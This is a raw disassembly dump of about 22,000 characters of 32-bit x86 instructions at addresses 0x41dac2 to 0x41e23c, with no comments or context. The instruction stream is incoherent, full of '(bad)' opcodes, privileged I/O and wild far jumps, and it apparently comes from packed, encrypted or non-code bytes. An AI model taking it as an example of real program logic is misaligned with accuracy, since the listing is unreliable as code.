  41dac2:	je     0x41dad1
  41dac4:	test   DWORD PTR [esi-0x32],ebx
  41dac7:	xchg   esi,eax
  41dac8:	mov    edi,0x5e834ba8
  41dacd:	sub    DWORD PTR [ebp+ebp*8+0x1db79f31],esi
  41dad4:	mov    edx,0x6bc14cb9
  41dad9:	lods   al,BYTE PTR ds:[esi]
  41dada:	jnp    0x41da83
  41dadc:	lahf   
  41dadd:	sahf   
  41dade:	mov    ecx,DWORD PTR [ebp-0x79b9bd8f]
  41dae4:	add    al,0xe5
  41dae6:	std    
  41dae7:	icebp  
  41dae8:	mov    ds:0xb9681af4,eax
  41daed:	in     al,dx
  41daee:	xchg   edx,eax
  41daef:	mov    bh,0xb3
  41daf1:	fisubr WORD PTR [ecx+0x5baea1e3]
  41daf7:	mov    edx,0x8a146a2f
  41dafc:	sub    al,0x50
  41dafe:	(bad)  
  41daff:	sbb    al,0x17
  41db01:	push   esp
  41db02:	ss push ss
  41db04:	bound  eax,QWORD PTR [ecx]
  41db06:	stc    
  41db07:	les    ebx,FWORD PTR [edi-0x13eba29b]
  41db0d:	mov    ecx,0xbb600104
  41db12:	dec    DWORD PTR [eax+0x5e]
  41db15:	popf   
  41db16:	(bad)
  41db19:	mov    dl,BYTE PTR [eax+0x3ab5d327]
  41db1f:	cmp    BYTE PTR [edi],dh
  41db21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db22:	cmp    DWORD PTR [edx],ebp
  41db24:	aas    
  41db25:	icebp  
  41db26:	mov    eax,ds:0xa6f581b6
  41db2b:	push   edi
  41db2c:	aam    0x5d
  41db2e:	mov    bl,dh
  41db30:	fstp   st(4)
  41db32:	xchg   esi,eax
  41db33:	mov    edi,0x7b04b950
  41db38:	arpl   WORD PTR [ebp+0x248f738b],si
  41db3e:	outs   dx,DWORD PTR ds:[esi]
  41db3f:	mov    ecx,0xe60d8938
  41db44:	fucom  st(2)
  41db46:	inc    edi
  41db47:	cwde   
  41db48:	cmp    DWORD PTR [ebx+0x7],esi
  41db4b:	xchg   DWORD PTR [ebx],esp
  41db4d:	pop    ecx
  41db4e:	or     BYTE PTR [esi],dh
  41db50:	jl     0x41dafc
  41db52:	aaa    
  41db53:	sbb    eax,0xd71589dd
  41db58:	pop    edi
  41db59:	dec    edi
  41db5a:	pushf  
  41db5b:	or     DWORD PTR [ebp+0x20],ebx
  41db5e:	pop    edi
  41db5f:	add    DWORD PTR [edi+0x10c9e3ff],ebx
  41db65:	dec    ebx
  41db66:	mov    dh,0xe0
  41db68:	test   eax,0x75d497ff
  41db6d:	xchg   edx,eax
  41db6e:	shl    BYTE PTR [edi+0x7],0x2a
  41db72:	push   0xbd887898
  41db77:	test   al,0x43
  41db79:	mov    cl,0xa9
  41db7b:	shr    BYTE PTR fs:[ebx],cl
  41db7e:	into   
  41db7f:	mov    BYTE PTR [ebp+0x7e],bl
  41db82:	lds    esp,FWORD PTR [ecx-0x1f502de5]
  41db88:	scas   eax,DWORD PTR es:[edi]
  41db89:	inc    eax
  41db8a:	pusha  
  41db8b:	jo     0x41db63
  41db8d:	xchg   edx,eax
  41db8e:	addr16 retf 0x5509
  41db92:	sub    DWORD PTR [esi-0x57],0x3e
  41db96:	push   eax
  41db97:	xchg   DWORD PTR [eax],edi
  41db99:	xor    eax,0x86c05912
  41db9e:	std    
  41db9f:	inc    ebx
  41dba0:	call   0x99412494
  41dba5:	pop    esp
  41dba6:	inc    eax
  41dba7:	out    0x61,al
  41dba9:	in     al,dx
  41dbaa:	faddp  st(6),st
  41dbac:	pop    edi
  41dbad:	sbb    ebx,ebx
  41dbaf:	mov    al,ds:0x32f3b302
  41dbb4:	push   ebx
  41dbb5:	fcomp  DWORD PTR [ebp+ecx*4-0x569ff4cb]
  41dbbc:	mov    ebp,0xc22ff90c
  41dbc1:	adc    BYTE PTR [esp+eiz*4-0x52e5df70],ch
  41dbc8:	ds xchg esi,eax
  41dbca:	lods   al,BYTE PTR ds:[esi]
  41dbcb:	fs and eax,0x8680b8df
  41dbd1:	sbb    BYTE PTR [ebp+0x30],0xf7
  41dbd5:	lea    edx,[ebx]
  41dbd7:	xor    ebp,ebp
  41dbd9:	(bad)  
  41dbda:	mov    esp,0xbcebd97b
  41dbdf:	add    BYTE PTR [eax],ch
  41dbe1:	jp     0x41dc34
  41dbe3:	and    ah,BYTE PTR [ecx+0x42f3882]
  41dbe9:	jbe    0x41dc21
  41dbeb:	pop    es
  41dbec:	xchg   edi,eax
  41dbed:	shr    DWORD PTR [ebp-0x7e],0x1a
  41dbf1:	ror    ch,cl
  41dbf3:	mov    ds:0xe4230a75,al
  41dbf8:	jns    0x41dbf6
  41dbfa:	test   DWORD PTR ds:0xd7d0a1b0,ebp
  41dc00:	and    al,0xd7
  41dc02:	mov    bh,0x89
  41dc04:	or     DWORD PTR ds:0xf0912190,esi
  41dc0a:	int3   
  41dc0b:	pop    ds
  41dc0c:	loope  0x41dc42
  41dc0e:	mov    eax,0xec391e13
  41dc13:	push   esp
  41dc14:	scas   al,BYTE PTR es:[edi]
  41dc15:	sub    eax,0xfd5d887f
  41dc1a:	cmp    DWORD PTR [esi+eiz*4],ebx
  41dc1d:	jbe    0x41dc8f
  41dc1f:	xor    al,0x45
  41dc21:	fwait
  41dc22:	std    
  41dc23:	dec    edi
  41dc24:	ds push ecx
  41dc26:	add    dl,BYTE PTR [esi-0x4b54b88a]
  41dc2c:	xchg   ebp,eax
  41dc2d:	out    dx,al
  41dc2e:	(bad)  
  41dc30:	or     eax,0x455dacce
  41dc35:	dec    edx
  41dc36:	add    BYTE PTR [ecx+ecx*1-0x2a76dab2],ah
  41dc3d:	mov    ch,bh
  41dc3f:	sbb    al,0xc7
  41dc41:	pop    ss
  41dc42:	das    
  41dc43:	pop    ss
  41dc44:	in     eax,0xf5
  41dc46:	ds xchg esi,eax
  41dc48:	cmp    DWORD PTR [ecx+0x17],ecx
  41dc4b:	inc    eax
  41dc4c:	ja     0x41dc9a
  41dc4e:	inc    ebp
  41dc4f:	dec    esi
  41dc50:	dec    ebx
  41dc51:	jl     0x41dc08
  41dc53:	dec    eax
  41dc54:	sti    
  41dc55:	xchg   edi,eax
  41dc56:	in     al,dx
  41dc57:	inc    edx
  41dc58:	data16 mov al,BYTE PTR gs:[esi+edi*4-0x58]
  41dc5e:	mov    bh,0xd0
  41dc60:	mov    DWORD PTR [ecx+0x57],edi
  41dc63:	jns    0x41dcb1
  41dc65:	or     BYTE PTR [edi+0x7f92ca29],bl
  41dc6b:	into   
  41dc6c:	outs   dx,BYTE PTR ds:[esi]
  41dc6d:	mov    bl,0x10
  41dc6f:	jecxz  0x41dc35
  41dc71:	rcl    BYTE PTR [ecx-0x58],cl
  41dc74:	mov    ebx,0xb34645d9
  41dc79:	mov    al,0x74
  41dc7b:	pop    ebx
  41dc7c:	inc    edx
  41dc7d:	out    0xc8,eax
  41dc7f:	xchg   ebp,eax
  41dc80:	fmul   DWORD PTR [ecx+0x5c551ad7]
  41dc86:	add    eax,0xb3669389
  41dc8b:	xchg   BYTE PTR fs:[edi+0x20],bh
  41dc8f:	nop
  41dc90:	cmp    BYTE PTR [eax+0x62],0xdc
  41dc94:	ss xchg edx,eax
  41dc96:	and    ebp,ecx
  41dc98:	(bad)  
  41dc99:	mov    esi,0x339e5e1b
  41dc9e:	cwde   
  41dc9f:	daa    
  41dca0:	outs   dx,BYTE PTR ds:[esi]
  41dca1:	fldcw  WORD PTR [eax+edi*1-0x6f]
  41dca5:	or     BYTE PTR ds:0xda5af38b,dl
  41dcab:	(bad)  
  41dcac:	shl    BYTE PTR [ebx+edi*8-0x7bf447e0],1
  41dcb3:	enter  0x2951,0x96
  41dcb7:	push   esp
  41dcb8:	(bad)  
  41dcb9:	inc    esp
  41dcba:	cld    
  41dcbb:	aad    0xfa
  41dcbd:	stc    
  41dcbe:	aam    0x17
  41dcc0:	aad    0x10
  41dcc2:	add    DWORD PTR [esp+esi*2-0x611a159b],esi
  41dcc9:	push   edx
  41dcca:	jmp    0xc4bf:0x9e5db10
  41dcd1:	inc    ebx
  41dcd2:	or     BYTE PTR [ebx+0x11c1c6e2],bh
  41dcd8:	mul    DWORD PTR [ecx]
  41dcda:	scas   eax,DWORD PTR es:[edi]
  41dcdb:	xchg   ebx,eax
  41dcdc:	dec    edx
  41dcdd:	push   edx
  41dcde:	inc    ebp
  41dcdf:	int    0xcd
  41dce1:	cmc    
  41dce2:	out    dx,al
  41dce3:	pop    ecx
  41dce4:	retf   
  41dce5:	sbb    bh,bl
  41dce7:	xor    esp,ebx
  41dce9:	add    eax,0x15a1c601
  41dcee:	callw  0xa7b2
  41dcf2:	push   eax
  41dcf3:	sbb    eax,0x649fa531
  41dcf8:	pop    es
  41dcf9:	push   esi
  41dcfa:	mov    cl,0xce
  41dcfc:	adc    eax,0xa751d648
  41dd01:	xchg   ebx,eax
  41dd02:	ret    
  41dd03:	popa   
  41dd04:	xchg   ebx,eax
  41dd05:	outs   dx,DWORD PTR ds:[esi]
  41dd06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dd07:	cmp    al,0x8
  41dd09:	and    al,0x12
  41dd0b:	pushf  
  41dd0c:	sub    DWORD PTR [edi-0x505a9c8b],edx
  41dd12:	scas   al,BYTE PTR es:[edi]
  41dd13:	add    cl,BYTE PTR [ecx+0x5eb37814]
  41dd19:	or     esp,DWORD PTR [ecx]
  41dd1b:	push   eax
  41dd1c:	mov    bh,0xe5
  41dd1e:	(bad)  
  41dd1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dd20:	std    
  41dd21:	mov    DWORD PTR [ebp+0x26ae2bb3],esi
  41dd27:	or     BYTE PTR [ebx-0x18],ch
  41dd2a:	mul    bl
  41dd2c:	push   eax
  41dd2d:	dec    BYTE PTR [ecx+0x4f70c7e4]
  41dd33:	repz sub BYTE PTR [ecx+edx*8-0xcdca619],0x93
  41dd3c:	sbb    BYTE PTR [edi],bh
  41dd3e:	jmp    0xf12a:0x2e044f8e
  41dd45:	pop    edx
  41dd46:	addr16 cmp al,0x5c
  41dd49:	sbb    DWORD PTR [esi-0x2b5e0d7f],esp
  41dd4f:	lds    ebp,FWORD PTR [ebp+0x3]
  41dd52:	lods   al,BYTE PTR ds:[esi]
  41dd53:	pop    ebx
  41dd54:	inc    eax
  41dd55:	jnp    0x41dda3
  41dd57:	xchg   esp,eax
  41dd58:	ins    BYTE PTR es:[edi],dx
  41dd59:	retf   0x37ee
  41dd5c:	lods   eax,DWORD PTR ds:[esi]
  41dd5d:	mov    ds:0x9f5f525c,eax
  41dd62:	mov    ah,0x2a
  41dd64:	inc    edi
  41dd65:	or     eax,0xf652dfe7
  41dd6a:	push   ds
  41dd6b:	xchg   DWORD PTR ds:0x16e5eb78,ebx
  41dd71:	ins    DWORD PTR es:[edi],dx
  41dd72:	jge    0x41dd1c
  41dd74:	jae    0x41dd75
  41dd76:	imul   DWORD PTR [edx-0x47621e9e]
  41dd7c:	mov    BYTE PTR ds:0x3b8dcedf,ch
  41dd82:	daa    
  41dd83:	and    edi,DWORD PTR [esp+edi*8]
  41dd86:	adc    eax,0x1a5188c3
  41dd8b:	leave  
  41dd8c:	jmp    0x83cc:0x13abe9e8
  41dd93:	jb     0x41dd33
  41dd95:	jo     0x41dd7c
  41dd97:	ins    BYTE PTR es:[edi],dx
  41dd98:	jae    0x41dd1a
  41dd9a:	mov    BYTE PTR [ebx+eiz*4-0x26],dl
  41dd9e:	call   0x18a4:0xf6944de
  41dda5:	add    al,0x19
  41dda7:	cmp    ah,BYTE PTR [edx-0x38ddb199]
  41ddad:	fiadd  WORD PTR [esi]
  41ddaf:	and    DWORD PTR [edx-0x52],0x48
  41ddb3:	pop    eax
  41ddb4:	cmp    BYTE PTR [ecx+eax*4],ch
  41ddb7:	xlat   BYTE PTR ds:[ebx]
  41ddb8:	addr16 (bad) 
  41ddba:	(bad)  
  41ddbb:	cmp    BYTE PTR [edx+ebx*4],bl
  41ddbe:	popf   
  41ddbf:	out    dx,al
  41ddc0:	or     DWORD PTR [esi],esi
  41ddc2:	popf   
  41ddc3:	out    dx,al
  41ddc4:	in     al,dx
  41ddc5:	jge    0x41ddd7
  41ddc7:	rol    BYTE PTR [eax-0x285b1451],cl
  41ddcd:	mov    eax,ds:0x71e47034
  41ddd2:	jg     0x41ddd0
  41ddd4:	call   0xb40c9803
  41ddd9:	icebp  
  41ddda:	push   esp
  41dddb:	xor    ebp,DWORD PTR [edx+0x37de1451]
  41dde1:	mov    edx,0x1bd6cd77
  41dde6:	fimul  WORD PTR [edi]
  41dde8:	fbld   TBYTE PTR [edx]
  41ddea:	push   0x16f85de5
  41ddef:	mov    al,0x54
  41ddf1:	inc    esp
  41ddf2:	and    DWORD PTR [ecx+0x74bc9a54],ecx
  41ddf8:	mov    al,ds:0x4cb14de5
  41ddfd:	fbld   TBYTE PTR [ebx+esi*4+0x2433e925]
  41de04:	inc    edi
  41de05:	push   esp
  41de06:	inc    edi
  41de07:	or     cl,BYTE PTR [edx]
  41de09:	mov    ebx,0x22ba8714
  41de0e:	(bad)  
  41de0f:	repz pop esi
  41de11:	rcr    BYTE PTR [eax+0x4a],cl
  41de14:	fisub  WORD PTR [eax+edx*4]
  41de17:	pop    ds
  41de18:	cmp    ecx,DWORD PTR [ebx+esi*1]
  41de1b:	repnz in eax,0x5c
  41de1e:	sub    eax,0xed5fa4d5
  41de23:	mov    esp,0xd01b9007
  41de28:	fist   WORD PTR [ebp-0x28]
  41de2b:	int    0x9b
  41de2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41de2e:	dec    esp
  41de2f:	das    
  41de30:	and    al,0xcc
  41de32:	mov    dl,BYTE PTR [ecx+edx*2-0x53]
  41de36:	ja     0x41de51
  41de38:	mov    ds:0x28c0e34b,eax
  41de3d:	add    DWORD PTR [eax],esi
  41de3f:	loop   0x41ddf3
  41de41:	xchg   ebx,eax
  41de42:	popa   
  41de43:	pop    es
  41de44:	fcomp  QWORD PTR [edx]
  41de46:	daa    
  41de47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41de48:	mov    ebx,0x2a0e2e0a
  41de4d:	or     eax,0x393e0763
  41de52:	dec    esi
  41de53:	lds    edx,FWORD PTR [edi-0x61bd31d8]
  41de59:	adc    eax,DWORD PTR [ebx+ebx*2-0x6105e2bc]
  41de60:	lods   al,BYTE PTR ds:[esi]
  41de61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41de62:	cmp    eax,0xac03ae5f
  41de67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41de68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41de69:	push   ds
  41de6a:	add    al,0x50
  41de6c:	and    ecx,DWORD PTR [ebx]
  41de6e:	pop    es
  41de6f:	into   
  41de70:	iret   
  41de71:	mov    esi,DWORD PTR [edx+0x6052f610]
  41de77:	retf   
  41de78:	ss jecxz 0x41de00
  41de7b:	ja     0x41de4a
  41de7d:	sub    ebx,ebx
  41de7f:	repnz dec ebx
  41de81:	jmp    0xa97a:0x86de797d
  41de88:	pop    ds
  41de89:	call   0xf40b70b0
  41de8e:	ret    
  41de8f:	jge    0x41de59
  41de91:	jmp    0xab6ad1b7
  41de96:	xor    al,0xe5
  41de98:	adc    al,0x47
  41de9a:	call   0xc280:0x94327422
  41dea1:	mov    fs:0xfad9fe69,eax
  41dea7:	mov    ebp,0x7150e7f3
  41deac:	ins    BYTE PTR es:[edi],dx
  41dead:	mov    cl,0x5e
  41deaf:	ins    DWORD PTR es:[edi],dx
  41deb0:	ret    0xc682
  41deb3:	push   ds
  41deb4:	add    BYTE PTR [ecx-0x6b],bh
  41deb7:	sti    
  41deb8:	out    0xe2,al
  41deba:	outs   dx,DWORD PTR ds:[esi]
  41debb:	ja     0x41de6b
  41debd:	dec    esp
  41debe:	prefetch BYTE PTR [eax+0x2af2882c]
  41dec5:	ds dec esi
  41dec7:	pop    edi
  41dec8:	add    BYTE PTR [edx],dh
  41deca:	mov    dl,0xc7
  41decc:	aam    0xea
  41dece:	push   eax
  41decf:	int    0x5e
  41ded1:	aaa    
  41ded2:	mov    edx,0x5274d706
  41ded7:	bound  edx,QWORD PTR [ecx]
  41ded9:	mov    ecx,0xfa81c176
  41dede:	and    DWORD PTR [edx-0x72],edi
  41dee1:	pop    ds
  41dee2:	ss iret 
  41dee4:	pop    esi
  41dee5:	cmp    DWORD PTR [edi-0x37],esp
  41dee8:	test   BYTE PTR [ebx],dl
  41deea:	xchg   ebp,eax
  41deeb:	test   al,0x30
  41deed:	pusha  
  41deee:	mov    DWORD PTR [edi],ebx
  41def0:	fwait
  41def1:	xor    BYTE PTR [edi],0x21
  41def4:	mov    ds:0x80181833,eax
  41def9:	dec    ebx
  41defa:	xor    BYTE PTR [edi],dl
  41defc:	dec    esp
  41defd:	cmc    
  41defe:	xchg   edx,eax
  41deff:	cmp    ebx,edi
  41df01:	icebp  
  41df02:	das    
  41df03:	out    0xe3,al
  41df05:	div    cl
  41df07:	outs   dx,BYTE PTR ds:[esi]
  41df08:	call   0x2a5c:0xcda8cc4a
  41df0f:	les    edx,FWORD PTR [ebp-0x6f3d77c0]
  41df15:	inc    edi
  41df16:	mov    ebp,0x875f4a7e
  41df1b:	addr16 icebp 
  41df1d:	in     al,dx
  41df1e:	push   ecx
  41df1f:	call   0x59a95fb
  41df24:	push   ebx
  41df25:	xor    edi,edi
  41df27:	xchg   ecx,eax
  41df28:	aas    
  41df29:	(bad)
  41df2c:	sub    al,0x80
  41df2e:	nop
  41df2f:	mov    ebp,0x48eeaa90
  41df34:	fst    QWORD PTR [edx-0x5f]
  41df37:	int3   
  41df38:	inc    ecx
  41df39:	xor    ebx,DWORD PTR [esi+0x642f7845]
  41df3f:	enter  0x4240,0x5f
  41df43:	dec    esp
  41df44:	js     0x41dee6
  41df46:	aam    0x2e
  41df48:	(bad)  
  41df49:	sar    DWORD PTR [esi-0x63e65672],1
  41df4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41df50:	cmp    esp,esp
  41df52:	xor    edi,DWORD PTR [esi]
  41df54:	pushf  
  41df55:	aaa    
  41df56:	aas    
  41df57:	mov    eax,ds:0xb1caf85d
  41df5c:	out    dx,eax
  41df5d:	aas    
  41df5e:	mov    ch,0xaf
  41df60:	push   eax
  41df61:	retf   0x7684
  41df64:	add    BYTE PTR [eax+edi*8],0xf0
  41df68:	xor    DWORD PTR [esp+edi*8+0x1b],ebp
  41df6c:	mov    dl,BYTE PTR [esi+ebp*4]
  41df6f:	add    BYTE PTR [ebx+0x46],cl
  41df72:	sbb    eax,0x2ed9364
  41df77:	out    0x52,eax
  41df79:	push   esp
  41df7a:	scas   eax,DWORD PTR es:[edi]
  41df7b:	daa    
  41df7c:	xchg   ebp,eax
  41df7d:	call   0x2393f9d9
  41df82:	push   esi
  41df83:	sub    DWORD PTR [esi],ecx
  41df85:	add    edi,DWORD PTR [edi-0x2d]
  41df88:	cld    
  41df89:	adc    dl,BYTE PTR [ebp+0xf]
  41df8c:	out    dx,al
  41df8d:	add    DWORD PTR [esi-0x4f5c1d1e],edi
  41df93:	cs sbb al,0x9b
  41df96:	adc    al,0x6b
  41df98:	lock add cl,cl
  41df9b:	out    dx,al
  41df9c:	mov    eax,0x1d72b62
  41dfa1:	add    al,0x96
  41dfa3:	arpl   WORD PTR [ebp+0x43],sp
  41dfa6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dfa7:	cld    
  41dfa8:	lds    eax,FWORD PTR [eax+ecx*8+0x24]
  41dfac:	retf   
  41dfad:	arpl   sp,ax
  41dfaf:	sub    ebp,ebx
  41dfb1:	and    al,BYTE PTR [ebp-0xa]
  41dfb4:	ins    BYTE PTR es:[edi],dx
  41dfb5:	pop    esp
  41dfb6:	mov    eax,0xd8ac9479
  41dfbb:	mov    eax,0x52cc3276
  41dfc0:	jne    0x41e025
  41dfc2:	inc    eax
  41dfc3:	jge    0x41df70
  41dfc5:	pop    ebp
  41dfc6:	stos   DWORD PTR es:[edi],eax
  41dfc7:	inc    edx
  41dfc8:	push   edi
  41dfc9:	xchg   edi,eax
  41dfca:	fwait
  41dfcb:	cwde   
  41dfcc:	dec    edx
  41dfcd:	fbstp  TBYTE PTR [ecx-0x42]
  41dfd0:	in     eax,dx
  41dfd1:	mov    ebp,0x511d0c40
  41dfd6:	lock push esp
  41dfd8:	hlt    
  41dfd9:	outs   dx,DWORD PTR ds:[esi]
  41dfda:	inc    ebp
  41dfdb:	popf   
  41dfdc:	dec    eax
  41dfdd:	fisttp DWORD PTR [eax-0x4b]
  41dfe0:	or     BYTE PTR [ecx],ch
  41dfe2:	push   es
  41dfe3:	in     eax,dx
  41dfe4:	gs aas 
  41dfe6:	div    al
  41dfe8:	data16 lahf 
  41dfea:	xor    esp,ecx
  41dfec:	or     eax,0x2b670a7
  41dff1:	xchg   ebx,eax
  41dff2:	rcr    BYTE PTR [edi],cl
  41dff4:	inc    ebp
  41dff5:	dec    eax
  41dff6:	inc    esp
  41dff7:	push   ebx
  41dff8:	pusha  
  41dff9:	sub    ebp,ebp
  41dffb:	ins    BYTE PTR es:[edi],dx
  41dffc:	mov    ah,0x9a
  41dffe:	call   0x93da576c
  41e003:	ja     0x41e019
  41e005:	mov    dl,0xd5
  41e007:	out    dx,eax
  41e008:	mov    dl,0x47
  41e00a:	dec    eax
  41e00b:	adc    eax,0x7701fec3
  41e010:	sub    al,dh
  41e012:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e013:	sbb    DWORD PTR [ebp+0x18edfd6f],ebx
  41e019:	cmp    DWORD PTR [edx-0x4a],esp
  41e01c:	push   esp
  41e01d:	js     0x41e087
  41e01f:	sti    
  41e020:	popf   
  41e021:	adc    BYTE PTR [eax-0x63f5c655],dh
  41e027:	scas   al,BYTE PTR es:[edi]
  41e028:	push   esp
  41e029:	imul   ecx,DWORD PTR [ebp-0x7c],0x4fdcb4f8
  41e030:	sbb    BYTE PTR [edi-0x74077726],al
  41e036:	int3   
  41e037:	mov    al,ds:0xd6a60b0e
  41e03c:	mov    ebp,0xf1b8d302
  41e041:	cdq    
  41e042:	cmp    DWORD PTR [ebx],edi
  41e044:	inc    edx
  41e045:	rcr    BYTE PTR ss:[edx-0x63],0x46
  41e04a:	adc    al,0xc6
  41e04c:	ss pop ds
  41e04e:	sub    al,BYTE PTR [eax+0x3b38e1e2]
  41e054:	jmp    0x41e013
  41e056:	jge    0x41e058
  41e058:	cmp    al,BYTE PTR ds:0x5425bd65
  41e05e:	repnz into 
  41e060:	jb     0x41e0db
  41e062:	push   0x1e
  41e064:	mov    edi,DWORD PTR [ecx-0x16508a57]
  41e06a:	pop    esp
  41e06b:	mov    ecx,0x165e615
  41e070:	daa    
  41e071:	loop   0x41e057
  41e073:	adc    ah,BYTE PTR [ebp-0x7ee03a0b]
  41e079:	cmp    eax,0x595df93c
  41e07e:	cmp    BYTE PTR [esi],ah
  41e080:	ds aad 0x6b
  41e083:	sbb    al,0x6e
  41e085:	mov    cl,0x3c
  41e087:	pop    ds
  41e088:	in     al,0xa2
  41e08a:	mov    al,0xca
  41e08c:	push   esi
  41e08d:	jmp    0x4c9870fc
  41e092:	retf   0x5942
  41e095:	cld    
  41e096:	lds    esi,FWORD PTR [edx-0x76807ba9]
  41e09c:	sub    DWORD PTR [edx],edi
  41e09e:	iret   
  41e09f:	or     esp,DWORD PTR [ebp-0x76092f85]
  41e0a5:	push   0x3d8b82fc
  41e0aa:	mov    eax,0x76e6d2dd
  41e0af:	jle    0x41e127
  41e0b1:	(bad)  
  41e0b2:	fisubr DWORD PTR [eax]
  41e0b4:	inc    edi
  41e0b5:	cmp    DWORD PTR [ebp+eax*8-0x554ce2d8],ecx
  41e0bc:	mov    eax,ds:0x4a6d314e
  41e0c1:	add    cl,BYTE PTR [edi+0x75140559]
  41e0c7:	xchg   esp,eax
  41e0c8:	mov    DWORD PTR [ebx],esp
  41e0ca:	enter  0x8f76,0xb4
  41e0ce:	in     eax,0xcf
  41e0d0:	xor    esp,DWORD PTR [ebx+0x6160eabc]
  41e0d6:	cs xchg edx,eax
  41e0d8:	or     dl,bl
  41e0da:	push   edx
  41e0db:	xor    esi,DWORD PTR [esi-0x35d05871]
  41e0e1:	or     BYTE PTR [esi],al
  41e0e3:	mov    al,0xc1
  41e0e5:	mov    al,ds:0x4c38837c
  41e0ea:	fdiv   QWORD PTR [ecx]
  41e0ec:	outs   dx,BYTE PTR ds:[esi]
  41e0ed:	adc    di,WORD PTR [edx+edi*1+0x2ffd92d6]
  41e0f5:	popa   
  41e0f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e0f7:	jne    0x41e104
  41e0f9:	mov    bl,0x96
  41e0fb:	fs out 0xc9,eax
  41e0fe:	mov    ebx,0xd2db01db
  41e103:	or     DWORD PTR [eax-0x64fecd33],ebp
  41e109:	mov    eax,ds:0xed55375a
  41e10e:	sub    bh,BYTE PTR [esp+ecx*8+0x6ff9aeb1]
  41e115:	fwait
  41e116:	pusha  
  41e117:	dec    ecx
  41e118:	jg     0x41e0e0
  41e11a:	xchg   edi,eax
  41e11b:	sub    DWORD PTR [eax+0x607ad815],ecx
  41e121:	stc    
  41e122:	mov    ds:0xf2f1fe46,eax
  41e127:	xor    al,0x72
  41e129:	imul   ebp,DWORD PTR [eax+0x14],0xffffffa5
  41e12d:	fsubr  DWORD PTR [eax]
  41e12f:	adc    al,0xfd
  41e131:	pop    edi
  41e132:	dec    esi
  41e133:	pop    eax
  41e134:	jmp    0x41e12b
  41e136:	inc    ebp
  41e137:	rol    DWORD PTR [ebp+0x43],1
  41e13a:	mov    edx,0xda793f4e
  41e13f:	jl     0x41e16b
  41e141:	inc    ecx
  41e142:	and    eax,0x5b6e6131
  41e147:	or     DWORD PTR [ecx+0x7bff05a6],ebx
  41e14d:	mov    ah,0xe8
  41e14f:	dec    edx
  41e150:	lock or ch,BYTE PTR [edx+0xc]
  41e154:	ficom  DWORD PTR ds:[eax-0x66]
  41e158:	test   ecx,ebx
  41e15a:	ins    BYTE PTR es:[edi],dx
  41e15b:	mov    edx,0x179dcd2a
  41e160:	imul   esp,DWORD PTR [esi+0x7d],0x487e4f30
  41e167:	popf   
  41e168:	call   0x8a9a2f2a
  41e16d:	ret    
  41e16e:	adc    al,0xca
  41e170:	into   
  41e171:	mov    dh,0x88
  41e173:	mov    edi,0xe40b3b46
  41e178:	in     al,dx
  41e179:	push   ebp
  41e17a:	xor    dh,BYTE PTR [ebp-0x6bbba54e]
  41e180:	xchg   esp,eax
  41e181:	mov    esi,0x840e5135
  41e186:	push   ebx
  41e187:	(bad)  
  41e188:	cwde   
  41e189:	scas   eax,DWORD PTR es:[edi]
  41e18a:	mov    ah,0x12
  41e18c:	mov    ebp,0xfa7ca537
  41e191:	and    bl,cl
  41e193:	push   edi
  41e194:	outs   dx,BYTE PTR ds:[esi]
  41e195:	lahf   
  41e196:	dec    eax
  41e197:	push   ss
  41e198:	mov    bh,0x7
  41e19a:	ret    0xa894
  41e19d:	cli    
  41e19e:	cld    
  41e19f:	(bad)  
  41e1a0:	or     al,0xdb
  41e1a2:	ins    DWORD PTR es:[edi],dx
  41e1a3:	push   ds
  41e1a4:	fld    DWORD PTR [esi]
  41e1a6:	(bad)  
  41e1a7:	je     0x41e15f
  41e1a9:	scas   al,BYTE PTR es:[edi]
  41e1aa:	mov    dl,0x28
  41e1ac:	pop    ebp
  41e1ad:	ins    DWORD PTR es:[edi],dx
  41e1ae:	inc    esi
  41e1af:	int3   
  41e1b0:	int3   
  41e1b1:	mov    esp,0x3ac8de30
  41e1b6:	clc    
  41e1b7:	inc    edi
  41e1b8:	ret    0x8ca
  41e1bb:	jl     0x41e185
  41e1bd:	mov    ecx,0x2ac67221
  41e1c2:	add    esi,DWORD PTR [eax-0x49]
  41e1c5:	or     DWORD PTR [ebx-0x54b9f75e],edx
  41e1cb:	(bad)  
  41e1cd:	sbb    DWORD PTR [ebp+0x47],edi
  41e1d0:	mov    bl,0xfc
  41e1d2:	jne    0x25f2c026
  41e1d8:	xchg   ebp,eax
  41e1d9:	jno    0x41e1ab
  41e1db:	pop    ss
  41e1dc:	jmp    0x41e1e0
  41e1de:	jecxz  0x41e254
  41e1e0:	dec    ebp
  41e1e1:	into   
  41e1e2:	popa   
  41e1e3:	loope  0x41e174
  41e1e5:	in     eax,0x3b
  41e1e7:	(bad)  
  41e1e8:	(bad)  
  41e1e9:	mov    cl,0xd7
  41e1eb:	inc    edi
  41e1ec:	lea    ecx,[edx-0x2cab5586]
  41e1f2:	fist   DWORD PTR [esi]
  41e1f4:	jl     0x41e1ac
  41e1f6:	rcr    BYTE PTR [ebx+esi*8+0x7bd34296],cl
  41e1fd:	cli    
  41e1fe:	pop    ecx
  41e1ff:	mov    bh,0x1e
  41e201:	sub    ecx,DWORD PTR [edi+0x61110087]
  41e207:	fs push edx
  41e209:	gs push ebp
  41e20b:	cmp    dl,BYTE PTR [eax]
  41e20d:	test   al,0x3b
  41e20f:	mov    ds:0x73bfec79,eax
  41e214:	addr16 mov edi,0x39029119
  41e21a:	mov    esp,eax
  41e21c:	push   esp
  41e21d:	imul   ebx,DWORD PTR [eax+0x317fdd2b],0xffffffe2
  41e224:	js     0x41e285
  41e226:	nop
  41e227:	inc    DWORD PTR [edx+0x33]
  41e22a:	sbb    esp,DWORD PTR [ebp+edi*1+0x3e3fd5b1]
  41e231:	mov    eax,ds:0x666a9dc
  41e236:	xchg   esi,eax
  41e237:	nop
  41e238:	pop    ss
  41e239:	out    dx,eax
  41e23a:	mov    bl,0xd0
  41e23c:	jns    0x41e2bb
